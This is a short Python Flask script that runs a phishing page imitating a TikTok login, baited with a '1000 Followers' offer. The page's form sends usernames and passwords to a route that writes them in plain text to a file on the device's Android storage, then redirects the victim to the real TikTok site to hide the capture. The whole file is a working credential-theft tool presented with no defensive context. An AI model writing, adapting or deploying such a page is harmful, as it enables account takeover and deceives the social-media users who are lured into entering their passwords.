from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def login_page():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>TikTok LOGIN</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: black;
                animation: colorAnimation 10s infinite;
            }

            @keyframes colorAnimation {
                0% { background-color: black; }
                50% { background-color: blue; }
                100% { background-color: red; }
            }

            .container {
                max-width: 400px;
                margin: 0 auto;
                padding: 20px;
                background-color: transparent;
                border: 1px solid #ccc;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            }

            h1 {
                text-align: center;
                color: #D3D3D3;
            }

            label {
                display: block;
                margin-bottom: 10px;
                color: #666;
            }

            input[type="text"],
            input[type="password"] {
                width: 100%;
                padding: 10px;
                border: 1px solid #ccc;
                border-radius: 5px;
                box-sizing: border-box;
            }

            button {
                width: 100%;
                padding: 10px;
                margin-top: 20px;
                background-color: #1877f2;
                color: #fff;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
    <div class="container">
        <h1>TikTok Login<br><center>1000 Followers</h1>
        <form action="/process-login" method="post">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Enter your username">

            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password">

            <button type="submit">Log In</button>
        </form>
    </div>
    </body>
    </html>
    '''

@app.route('/process-login', methods=['POST'])
def process_login():
    # Get the submitted username and password from the form
    username = request.form.get('username')
    password = request.form.get('password')

    # Append the data to the file
    file_path = "/storage/emulated/0/download/untitled.html"
    with open(file_path, "a") as file:
        file.write("Name: " + username + "\n")
        file.write("Password: " + password + "\n")
        file.write("Successful\n")

    # Redirect the user to the TikTok website
    return redirect('https://www.tiktok.com/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
